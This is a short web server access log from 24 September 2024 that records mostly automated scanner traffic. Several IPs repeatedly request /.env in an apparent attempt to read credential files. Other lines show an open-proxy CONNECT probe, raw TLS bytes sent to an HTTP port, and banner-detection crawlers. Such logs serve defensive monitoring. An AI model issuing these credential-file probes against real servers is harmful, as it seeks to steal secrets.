185.224.128.47 - - [24/Sep/2024:13:29:04 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
154.216.19.70 - - [24/Sep/2024:13:54:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
79.124.8.107 - - [24/Sep/2024:14:14:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
183.134.104.149 - - [24/Sep/2024:14:41:52 +0000] "CONNECT www.baidu.com:443 HTTP/1.0" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
135.125.244.48 - - [24/Sep/2024:14:47:44 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [24/Sep/2024:14:47:44 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.33.41.25 - - [24/Sep/2024:15:57:31 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.33.41.25 - - [24/Sep/2024:15:57:31 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [24/Sep/2024:16:07:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
192.42.116.213 - - [24/Sep/2024:16:54:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
91.90.42.154 - - [24/Sep/2024:16:54:53 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [24/Sep/2024:16:54:54 +0000] "GET /6wIf HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
91.90.42.154 - - [24/Sep/2024:16:54:54 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
91.90.42.154 - - [24/Sep/2024:16:54:54 +0000] "GET /7xCk HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
135.125.244.48 - - [24/Sep/2024:17:03:02 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [24/Sep/2024:17:03:02 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.77.56 - - [24/Sep/2024:18:05:00 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:00 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:01 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:01 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:01 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:01 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:02 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:02 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:02 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:02 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
62.115.255.162 - - [24/Sep/2024:18:05:14 +0000] "GET /wy48 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
103.231.89.218 - - [24/Sep/2024:18:05:18 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:35 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:05:57 +0000] "GET / HTTP/1.1" 200 1401 "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [24/Sep/2024:18:06:41 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [24/Sep/2024:18:06:53 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [24/Sep/2024:18:07:24 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
87.236.176.109 - - [24/Sep/2024:18:09:18 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
135.125.244.48 - - [24/Sep/2024:18:30:57 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
